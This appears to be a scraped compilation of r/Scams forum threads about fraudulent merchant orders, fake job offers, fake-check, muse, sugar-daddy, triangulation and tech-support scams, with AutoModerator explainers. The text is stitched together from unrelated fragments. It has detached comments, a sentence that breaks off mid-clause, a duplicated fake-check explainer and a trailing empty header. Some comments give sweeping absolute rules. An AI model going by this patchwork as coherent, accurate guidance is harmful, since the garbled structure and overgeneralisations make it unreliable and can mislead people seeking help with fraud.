I feel bad for my tech bros, I honestly do. The past 2 years have been brutal for anyone in this industry, and there just seems to be no signs of it getting any better.

Title: Saved card on Pet Valu used to charge orders
Body: Today I got 2 email confirmations for orders placed on Pet Valu. One for $350, one for $175. They were placed through my existing Pet Valu account. I had a saved card on file because I buy pet food from there all the time. The shipping address for the alleged receiver is in Pickering, ON.

I contacted my bank already who told me I need to reach out to the merchant. Obviously they're not open now, in the evening, so I pre-emptively went in and removed my saved card.

I have some questions if anyone has experience with this... thanks.

1. What are the chances that this is affecting just my account? I can't find any info on this happening to anyone else. It seems like a clear security issue on the Pet Valu website. Was I hacked? Were they hacked? How did this happen?

2. Re: the shipping info, it seems highly unlikely that the name, address and phone number are real. Would someone be stupid enough to do this and give their real address or is this a location where fraudsters pick up products or something??

3. I also pre-emptively locked my debit card - thoughts on whether this necessary to continue doing? This seems like an isolated incident limited to unauthorized use within my PetValu account. I would hate to have to replace my card that all my pre-authorized transactions are tied to. I guess better safe than sorry.

- 1. Does it matter? Someone was able to get into your account and order stuff. You probably will never find out how it happened.

2. Probably shipped to a package mule who will, usually unknowingly, forward the packages or a vacant house where the scammers can come pick up the delivery after it's delivered.

3. I would replace the debit card with a new one including a new number and pin. Sure it's a hassle but better than finding your account cleared out and then having to change everything anyway.
- Unfortunately, merchant credit cards and accounts are not always as secure as they should be. PetValu will refund you once this gets sorted out but you did the right thing in locking your debit card. 

You should replace it, as your other preauthorized accounts could be compromised - it's hard to tell, and not worth it to find out the bad way. If your debit card is tied to your bank account, you might also lock your account until this is sorted. Also, credit cards are safer than debit cards, with better security.

As for your other questions: not your problem. PetValu will deal with whatever data breach may have happened if it affects other customers.

Title: TikTok Badge Scam - Beware
Body: I received an email today supposedly from TikTok informing me that I should apply for a verified badge for my account as a content creator or business.  Funny thing is that the scammer included the TikTok description of a verified badge and what it means to have one.  At the end of the agreement it clearly states that TikTok will never send an email encouraging you to apply for a badge.  That is what caused me to stop to do more research before giving information.  If you click the link to apply it takes you to a screen to log into TikTok with your account name.  Lo and behold when doing a search in the app I found a video warning of this scam and what would happen if you complete the application process within the email.  They will hack your account and you may not ever get it back.  Delete the email and don‚Äôt click $h!t.

- Shifting the blame. "Nooo, not my fault whatsoever."

- Yes it's a scam. No legit financial adviser does business on whatsapp where you have no way to verify anyone. There are many websites with the same company name - if you sent crypto into the site, the platform is fake. !crypto

Please watch out for recovery scammers that claim you can get the money back. They can not help. Scammers lurk here to target people who have lost funds.
- Yes, its a scam. We could look up the company website, but it's not necessary because your experience follows the same pattern as investment scams posted daily to r/scams. Also, the scammers change the company name and websites often. New "company", same scam.
- Yes, it is an investment scam. I think this "company" was reported here yesterday. There are reports of this type of scam every day, the names change but the scam is the same. Cryptocurrency is unregulated, and not recoverable, which is why scammers love crypto. 

As others have said, the money is gone. You didn't invest money, you gave it to the scammers.  **There is no investing site or app, that's all lies, nothing but lies.** There is no profit. The screens that show how much you made? Just numbers on a screen to make you believe that you were making money.  Scammers make a whole fake crypto website. It's not hard to create a website. All the info and $$ figures on the site were fake, just big numbers on a screen to make you think you made money. Check out other stories on this sub. People lose thousands of dollars / pounds / Euros, they lose all their savings.
- These investment group chats on WhatsApp/Telegram of people showing their 'gains', are all bots.


Nobody is making money on these platforms, the money goes straight to the scammers bank account.


They say it's in crypto because that's the hype word right now and they want to convince you to keep paying in.
- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

Title: Is this company a scam or are they actually trying to recruit me?
Body: Hello everyone,

I had an unknown number reach out to me the other day, saying that their team saw my Indeed profile and asking if I would be interested in a position with their company. The text had an email to reach out to, which I did. I've had some back and forth email exchanges with one individual and a single phone interview before they offered me a position. However I want to make sure I'm not being scammed. So here are the red flags that I'm concerned about.

The initial email was a Gmail address, after our first email exchange the address changed to the company name in the other emails

I can't seem to find much information about the company online, it's called Mild Core Platform. They have a website, which is just their name with .com at the end, all one word, but that is the only online presence I can find. It appears to be a crypto company of some kind but I can't find it on any crypto site I searched. 

The phone interview was of poor quality and almost sounded like an AI voice, although that could have just been the quality/accent of the speaker. 

The latest email asked for a selfie with my id, this would be my first remote job so I'm unsure if that is standard or not.

There haven't been any visual interactions, no face to face, no zoom or video conferences.

So does this sound like a scam or am I just being paranoid. And if it is a scam how bad is it that I sent a picture of my ID

- >I had an unknown number reach out to me the other day, saying that their team saw my Indeed profile and asking if I would be interested in a position with their company.

Yes this is a scam.

It's going to be a !task scam.

Very common. Just search for indeed on this sub.

They can use the picture of your id to scam others.
- You can use whois site to see this info (or the subreddit's prompt) but that domain was only made just shy of a month ago.

!job scams can go many different ways, often fake checks. With the crypto aspect it sounds like they'd maybe try to use you and your accounts to launder money for them. (pretending it's funds from their fake company/clients)

What kind of ID? Scammers may use it in other scams. Maybe call your credit bureau to flag and take measures for identity theft. Keep an eye on your credit.
- They are trying to recruit you, to fall for a task scam and give them your money.
- One more time: there are no entry level remote jobs EVER. As stated it will either be a task scam, or a !fakecheck where you need to order a computer from their vendor and they will send a check to pay for it, or just outright identity theft as you give your SSN and bank info for getting paid.

Businesses don't randomly look for employees online and then ask them to apply for a job. That isn't how businesses work.
- !whois Mildcoreplatform.com
- Ot top of the red flags you mentioned, website was just up less than a month old. And on top of that you mentioned they're a crypto company of some kind - I would say Scam.  

They're leveling up with the actual phone interviews now eh. Guessing there's a lot of pauses on the interview? Likely text to speech or and like you said likely  AI.
- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Hi /u/RacerX200, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

Title: Offered ¬£10 Amazon gift card for a 5 star review
Body: Hi. I‚Äôm aware of the practice of people getting free stuff for giving 5 star reviews on Amazon, but have never experienced it first hand. 

I recently ordered some anti snore nose strips for my mrs as she snores so loud the neighbours can hear her!! Either way, what it was isn‚Äôt important. She does snore loud though!!ü§£

A few days ago I got a card through the post saying I was a ‚Äòlucky star‚Äô or some such nonsense, but the essence of the message was if I leave a 5 star review, take an actual screen shot of it, then email that screen shot to some long arse email address, they would email me a ¬£10 Amazon card. 

Like I say, I‚Äôve heard of similar things happening, but why would the seller a) not email me via Amazon, for example, rather than a physical letter and b) need me to email them a screen shot of the review, when they would be able to see any review that I leave them on Amazon anyway??

Sounds sketchy to me.

- It's against Amazon TOS, and the law, for sellers to offer compensation for reviews. If they stayed on platform and you reported it, it would be cut and dry because Amazon can see that they sent you that message. If you get it through the post it's still a no no which can be reported and potentially have negative consequences for the seller, but there's a level of plausible deniability. "What? No!!! We'd never engaged in review manipulation, this must have been sent by one of our competitors!" or something.

- Hi /u/Pale_Session5262, AutoModerator has been summoned to explain the Amazon review scam.

Amazon review scammers are trying to buy 5 star reviews without looking like they‚Äôre buying 5 star reviews. A long time ago, sellers could offer free or discounted coupon codes to buyers in exchange for an ‚Äúhonest‚Äù review. [This practice was banned in 2016](https://blog.aboutamazon.com/innovation/update-on-customer-reviews), replaced by Amazon‚Äôs Vine program. [FTC rules](https://www.ftc.gov/news-events/press-releases/2009/10/ftc-publishes-final-guides-governing-endorsements-testimonials) also dictate that any reviews or product promotions obtained in this way have to be clearly labeled as such. To get around both the FTC‚Äôs labeling rules and Amazon‚Äôs ban, there are websites and private Facebook groups that link together shady sellers with people willing to sell positive reviews.

These shady sellers usually sell cheap products that would otherwise not receive positive reviews (or many purchases at all) naturally. You're either asked to pay for it in full on Amazon, and be reimbursed via PayPal (which Amazon famously doesn‚Äôt use) to hide the transaction, or receive a gift card. Here‚Äôs an excellent [article](https://www.buzzfeednews.com/article/nicolenguyen/her-amazon-purchases-are-real-the-reviews-are-fake) describing in-depth how this process works. One should never trust an Amazon (or other merchant's) review - carefully research the products they purchase instead. Of course, there‚Äôs always the chance that an Amazon Review scam is just a scam and they‚Äôll just take your money and run. Credit to user SuwanneeValleyGirl for this script.

- so if the person who calls in cashes the check, they will receive a call from the scammer pretending to be the person who signed over the check asking for the money back? what if he just doesn't give it?
- Often we see with fake checks is that the scammer will overpay then ask the victim to send the excess money via a non-refundable method (zelle, cashapp, bitcoin etc)  Since some or all the funds are shown in the account due to bank laws, the victim thinks the check is 100% ok and now owes the scammer those excess funds.

With victims that catch on and don't send funds, we've seen the scammer threaten the victim with being arrested or even death threats.

Title: Is this job from LinkedIn a scam or is it legit?
Body: So I‚Äôve been looking for an online job lately and applied to this one I found on LinkedIn from a company called SeaBreeze Living and Homes. The job sounded cool, but literally immediately after I applied, I received this email saying I‚Äôve been moved onto the onboarding process. I also applied to 2 other similar jobs at companies called Adventure Awaits Agency and Erika 4 Travel Agency with the exact same result, got emails telling me to sign up for an interview literally immediately after I applied. This all seems like a clear scam to me, especially since none of the emails even included names for the hiring managers, but is it possible these jobs could be legit?

- ‚ÄúOur vendors‚Äù is the tip off. They‚Äôll tell you all about how you‚Äôre supposed to buy software and hardware from their vendors. Once you‚Äôre hired they‚Äôll send you a fake check and ask you to deposit it and then send the funds to the ‚Äúvendors.‚Äù
- There are 10,000 fake remote work/wfh job scams online for every real one. People with real work from home jobs have experience or training in the industry, the low skilled jobs like this don't exist. If you need a part time job, just look for one in your area. This is a blatant scam attempt and you will encounter many others.
- Do more research into the companies. Do they have websites? How many people are working for them? Are the people who work for them real or suspicious profiles? It's not uncommon to be asked to do a virtual interview immediately or schedule a call with a recruiter, but those usually come from the platform you applied on (i.e. Workday, Brassring), and not an email.

Also, my general rule of thumb is to apply to jobs on a company's website, not through LinkedIn - there are too many scams and ghost jobs, and even legit jobs do not always make it through to company recruiters.
- These companies are laying off people en masse.  Nobody legit is hiring a remote social marketing expert.
- There are no entry level skilless remote jobs EVER. Businesses just don't work that way. The few remote jobs either require specialized skills with lots of previous experience or doesn't pay well enough to bother doing.
- Thank you, that part I wasn‚Äôt even paying attention to
- Thanks for the advice!
- Thank you for the advice it‚Äôs very helpful!
- Yes to the last paragraph; find the jobs on job search boards then go to the company websites and apply directly on them.

It‚Äôs not the name of this site or that app you need to memorize because these scams all have similar elements (withdrawal fees, etc.), claims, come-along scripts, and are targeted at people who are gullible and greedy with nebulous promises of easy riches which if actually true would turn every single man, woman, and child in the world into millionaires, at least.

Anyone who is saying they can get your money back is a scammer. Stop interacting with any of them.

The attorney is fake. He's impersonating a real person who works on Capitol Hill and has nothing to do with cybercrimes and is not even practicing law at the moment. It's clear the scam is China based looking at website & correspondence they send with random chinese lettering included.

I'd also worry about identity theft at this stage. It looks like they already tried to hack two of my bank accounts and two separate emails. --  if you downloaded their app, everything on your phone is likely at risk, a friend confirmed their app was actually malware.

We all may need to lock our credit before it's too late.
- Hi /u/Laines_Ecossaises, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

Title: Mikkelsen Twins, more "Cash for Them Accelerator"- Just a Bigger Scam
Body: I ponied up to join this program in June 2024.  Recently laid off with some publishing background, this was perfect - a combination of what I already knew with the added know-how of using modern platforms - KDP, Spark, 99Designs, FiveRR, etc - and I'd surely do well.  It wasn't a lack of effort - I dug in, watched the videos - and had my "coaching" sessions with what I soon learned was an off-the-scale condescending "coach."  Who took pride in telling me not to follow the guidance of the videos but to listen to her? Yep. 

I soon saw that this was, among other things, a multi-level scheme.  We'll get you hooked on the video courses and sell you something else: AI manuscript development. We'll sell you Publishing Services, "a separate company" that just happens to be run by one of their wives -and they produce a sh1tty work product, then something else, and it goes on.

They keep signing up new people, and it makes me sad to see the enthusiasm (that I had) in these poor people who will eventually find out they've been had - but at what cost?

They're saturating the market with people publishing OK products on the same topics - it's cut-throat, too - sharing your topic will likely mean that there are three or more books on your topic published by others in the program.  And all the time, the Mikkelsen twins are cashing their checks.  DO NOT, Do NOT fall for this. 

Adding up the course cost, the services I purchased, and the Facebook and Amazon ads I ran - I have stopped at just over $4k out of pocket.  How much have I made?  $4.68!!!!!

For me, I'll get a write-off, a scolding as I should have known better, and proof again that fast-talking snake oil scammers continue to weave their evil spells  - but for others who are killing themselves and will never move to Bali (the promise), it is reprehensible.

This appears to be a common scam where they impersonate the police with fake charges and eventually will ask you for payment to "avoid" the arrest or drop the charges. It's all fake.
- The number of responses will be limited since this is not in English and I gave up waiting for the reddit translation to run. But yes, this is most probably a scam. Run it through the google translator and append the post with English.
- Police won't send you a text saying you are being investigated giving you a chance to disappear. They show up at your house and knock on the door. This text scam is fairly popular. If you were to respond (don't respond, just letting you know what usually happens), they would tell you that a fine needs to be paid...usually in apple pay or Bitcoin (no, really...the police supposedly now accept Bitcoin). Just block and delete.

This is essentially a variation of the USPS scam, as well as some others.

- The real pity of it is, these scams prey on the weak, the elderly, and the gullible. Just watched a YouTube video a couple days ago about A. $5,100 stimulus payment to be deposited directly to your bank account in the next few weeks. The scam wasn't to steal money directly but to draw enough Clickbait and to gather enough advertising revenue to make a few quick bucks before they were shut down. With the growing presence of AI it's going to be a million times worse and it's quickly becoming survival of the fittest. I even got excited for a quick minute before the bullsh!t detector went off in my head. The most disheartening part was the hundred plus comments expressing joy because it was the only way they were going to keep their heads above water for the next month.
- I'm pretty sure the IRS would already have your bank account information and address on hand from filing your tax returns to either do a deposit or send a paper check. I got these payments when they first came out and didn't have to provide any information to the IRS to receive them. What a hoot.
- There IS a EIP getting sent out to SOME tax payers. But you don't have to do anything to get it, they're mailing it to the address on your 2023 taxes.

You can use the whois.comwhois website to see this info (the registered date is the creation date)

https://www.whois.com/whois/caissue.shop

Personally would avoid these types of sites. These online shops advertising unrealistically cheap prices on social media/ads are usually questionable shell companies or drop-shipping sites. These businesses are often newly created, source goods from platforms like Alibaba, and may sell counterfeit or unsafe products with poor customer service and shipping delays. Buy from known legitimate shop sites online, not these sketchy ones.
- It was odd cause the socials they have linked don‚Äôt pop up to a social page, it just opens the app. lol the Instagram one leads you to LinkedIn

This domain name was first registered 30 years ago (Jun 1994) and it has been pre-registered for multiple years into the future. (It doesn't expire until 2027.) 

Note that 1994 is when the domain was FIRST registered. Sometimes scammers buy old expired domains to repurpose them into scams. [Look at WaybackMachine](https://web.archive.org/web/*/http://shop.com) to see if the website "changed" recently. 

A potential concern may be that they are not sharing their contact info on Whois. This website is hosted on a server located in the United States (*DataChambers, LLC*).

Title: Microsoft defender scam
Body: My husband got a pop up on his laptop this morning that said Microsoft defender has shut down your computer due to a potential virus and to phone Microsoft service to restore the computer.He called the phone number and I told him to hang up right away. We turned the laptop off and restarted but the same screen came up and we couldn't access anything on the laptop.
We took the laptop to a computer repair company and they said even if he didn't give the person any information that just by calling the number they gained access to our computer. Is that possible? Now I'm wondering if we're getting scammed by the repair shop.
We have notified our bank and cancelled all credit cards just to be safe.

- Hi /u/YourUsernameForever, AutoModerator has been summoned to explain the Tech support scam.

[Tech support scams](https://en.wikipedia.org/wiki/Technical_support_scam) can start with the scammer contacting you, through a random phone call, pop-up on a website, notification, or email. You can also run into tech support scams by Googling a support phone number and seeing an advertisement placed by a scammer meant to look like a legitimate support page. To avoid tech support scammers, always ensure you are on the correct website when you're looking for a support number to call. Don't be afraid to hang up and double check if you have called for support but think you may be talking to a scammer. If you're talking to support and they mention anything about gift cards, hang up.

Title: Someone asking to use my face for "art project"
Body: I recently had someone reach out to me on tiktok asking if they could use my pfp as a reference or something for an art project. I was like..sure? My profile is public so I dont really care. They explained the project, what the client was asking for, when it would be finished, and said they'd send me a copy. They haven't asked for any information from me but they're saying that I will be compensated. The compensation is..a lot. This will turn out to be a scam right? I'm so confused.

edit: i was not expecting comments so quickly but BIG THANK YOU to all that commented!!! Luckily I have not sent any information to this person and they were just starting to message me more frequently.....they are now blocked. The "compensation" was over 500 lol.

Internet free money is never not a scam.

- OP, in these scams, they often try to send you a fake check. Know to NEVER accept or deposit a (fake) check from a stranger. Funds are only shown due to bank laws, and it can take days or weeks to be caught. Depositing a fake check could not only get you a fee,  but your bank could decide to cut ties with you and close the account.
- I don't think any artist in the history of ever has wanted to  throw down that much money to a muse.
- "whoops! We accidentally sent you five thousand. Kindly cash the cheque and return us the difference."
- Hi /u/seedless0, AutoModerator has been summoned to explain the Muse scam.

The muse scam is a variant of the [fake check scam](https://consumer.ftc.gov/articles/how-spot-avoid-report-fake-check-scams) in which the scammer will contact the victim over social media and claim to want to use their image for an art project. The scammer will often use a stolen social media account to increase their credibility. They will offer a generous sum of money and offer to pay via check, and the victim is instructed to send money to the scammer for ‚Äúmaterials‚Äù via an irreversible method. The victim is under the illusion that the funds cleared when the bank makes the money available thanks to current regulations. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months.

If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. You can summon the fake check automoderator explanation using the trigger fakecheck. Thanks to redditor aNeatHat for this script.

- !crypto
- Hi /u/Flaky_Law2653, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

Title: Is this some sort of scam? They actually sent a refund by it's just too fishy. What's the endgame?
Body: I bought an item on eBay a few weeks ago and received it a few days later and now the seller is claiming they're having issues receiving payment. I obviously have no intentions of doing it but they want me to pay through PayPal F&F and they actually refunded the order. On my end, payment went through as usual. Now they're saying the delivery person is going to talk to me? Like that's even a remote possibility lmao 
Some things to note are:
 A) There was never a tracking number attached which makes me think it was drop shipped 
B) They actually sent two of the item I ordered (separate shipments), and 
C) The name and email address on the PayPal account are totally different names from each other.

Transcript:
Seller: sorry, my store is having payment error on order
hope you can help

Seller: sorry, my store has an error that cannot receive payment for the order
i know this is annoying

i know this is annoying

Me: I‚Äôve already paid and already received the product

Seller: i have refunded your order, my store has an error that cannot be resolved i have contacted ebay about this

- The endgame is they're never shipping anything, report the seller. Talk to ebay support in the app.

If you pay them via friends and family, the sale is cancelled because they refunded you, they ghost you and you're left with no money and no item. Never pay outside ebay.

Report the seller.


EDIT: wait you received the item?? !triangulation
- You got the item, you paid for it and the payment went through.

Did these communications all occur on Ebay's website, through the message interface? If so, just tell the seller you received the item, your payment went through, and you're done. That way, if they messed up something at their end, it's up to them to contact Ebay seller support.

If ANY of this communication happened outside the Ebay interface, it is a scam. Ignore it and if necessary block.

If you did receive a refund, then you can open a claim with Ebay, which is the only way you can contact them to ask them to sort it out. 

Long story short: this sounds like a scam, but if the seller is very new to Ebay, it could be that they messed something up. Either way, it's not your problem.
- Yes I received the item not once but TWICE. I edited the text to make that more clear. Triangulation does sound like the most likely conclusion. Interesting, thanks.
- Hi /u/YourUsernameForever, AutoModerator has been summoned to explain the Triangulation scam.

A [triangulation scam](https://www.reddit.com/r/Scams/s/dyLMK2PxtI) involves four actors:
* A scammer posing as a seller on a popular platform
* A legitimate buyer
* A victim whose card was stolen
* A legitimate merchant

The seller is the scammer acting as a middleman - typically in platforms that involve third party sellers such as Amazon or similar. A legitimate buyer purchases the item. The scammer then goes to a legitimate merchant and buys the item with a stolen card, and ships it to the buyer. The buyer receives the item, and the owner of the stolen credit card is left holding the bag.

The way to tell if you‚Äôve been a participant of a triangulation scam is that the tracking number provided in the platform will not match the shipping label of the item you just received. This is because the seller needs to submit a tracking number on most platforms, so they will send you an empty package, an envelope, or a random item, to generate such a shipping label in the buyer‚Äôs name.

Any time there‚Äôs two shipments involved in a purchase, report it. If you suspect you have been an unwilling participant in a triangulation scam, call the number on the back of your card and talk to the fraud department. Also contact the support channel of the platform where you bought the item. You want to establish a paper trail.


**
- Yes it was all through eBay and I did receive a full refund after telling them not to. It‚Äôs their problem now. They sent me a different PayPal email address today with a totally different name (4 different names now), female names this time. Definitely a scam, I would say.
- They're definitely dropshipping the items to you, bought with a stolen card, and asking for clean money via friends and family. It's a specific variation of the triangulation scam that I'll be adding to my triangulation post. It's very very interesting. Sloppier than the regular triangulation scam, that is more seamless, but allows for collection of clean money without using a payment processor. Clever.
- And if it is that sort of scam maybe report them to PayPal and Hotmail as well.

I thought it was some funny role play but then she sent me a check and told me to deposit it, after that told me to transfer some money to a cashapp tag she says is the charity of a friend of hers. She is sent the checks through email and they look like they were just scanned then sent or even made in a

- !sugar

There is no sugar without in person sex. Report, block and move on. There is no easy money online.
- Dude. You've been scammed before, and you are getting scammed again. You really need to educate yourself to become more scam-proof. There are many people that are trying to scam you to take your money.

Anyone that contacts you randomly, either on social media, by phone, email, or text, is trying to pull a scam on you. The only exceptions would be sales people who want to sell you something which is probably overpriced.

Anybody online that says they want to give you money is lying, they really want to steal your money. No exceptions.

Anybody sending you naughty pictures, or asking you to send them nudes, is trying to trap you into a blackmail scam. No exceptions.

Anybody claiming to be rich, having the secret to get rich, and saying they will help you get rich, is a lying scammer who will steal your money. No exceptions. 

Deals on cheap products, 50% or more less than full price, are a scam -- you either get cheap imitation crap, or you get nothing.

Thise are some things to be aware of. There are more -- job scams, dating scams, crypto investment scams. Read through this sub to get an idea of different online scams.
- Of course this is a scam. Sugar anything is a scam. As you noticed the check is fake. The bank will, in good faith, make the funds available right away. Some time later they will notice the fraud and take the money back. By that point you‚Äôve already given the scammer your money and they are long gone.
- It's a also a !fakecheck¬† incase anyone else comes across this you can not deposit a check that has been emailed to you. That is not a legit thing
- !sugar !fakecheck complete with 'send your real money to me, but it's not really me it's a charity for my friend honest you can trust me I gave you money and showed you screenshots that I'm super rich'.

This isn't a complex scam, this is basic.
- For the record, I do not know a single woman who would pay for an "online sugar baby".
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Sugar daddy or momma scam.

Sugar dad/daddy/mom/momma scams are [very common](https://www.fraud.org/sugarbaby_alert) and usually come in two varieties: fake check style scams, and advance-fee scams. Fake check style scams involve the scammer making a fraudulent payment to you that will later be reversed, and then you making some sort of payment to the scammer that will not be reversed. Common examples include the scammer sending you a fake check and asking you to buy gift cards, or to send money via Western Union, or to purchase Bitcoins. Another common example involves the sugar scammer offering to pay your bills, or offering you banking information that you will use to pay off your bills. These bank accounts are stolen and the innocent victim will reverse the charge when they notice the fraud.

The second variety of sugar scammers use advance-fee scams, where they offer you money but require you to pay first. They may ask for you to pay them to prove that you are loyal, or they may require you to pay a processing fee. It's common for sugar scammers to send spoofed emails that look like they came from services like PayPal or CashApp that will inform you that you have received money, but that also ask for a processing fee before the funds are released.

In the real world, sugar babies are sex workers that engage in in-person sexual encounters with their clients. **We do not recommend that people try to be a sugar baby, but if this is what you are looking into, check out the following subreddits for information on how to be safe: r/SugarLifestyleForum/ and /r/SexWorkers**.

- Yeah I already reported them to the server they came from, at this point Im just annoying them by saying "give me a moment" "ok its not working" "its loading now" "I had to do something rela quick".
- Good rules!  
I would add:

Anyone sending you a screenshot of anything is a scammer.  

Anyone sending you a picture of any type of ID is a scammer. They don‚Äôt mind sending that to random strangers, because it‚Äôs not actually their ID.
- Hi /u/Helostopper, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Hi /u/TheMoreBeer, AutoModerator has been summoned to explain the Sugar daddy or momma scam.

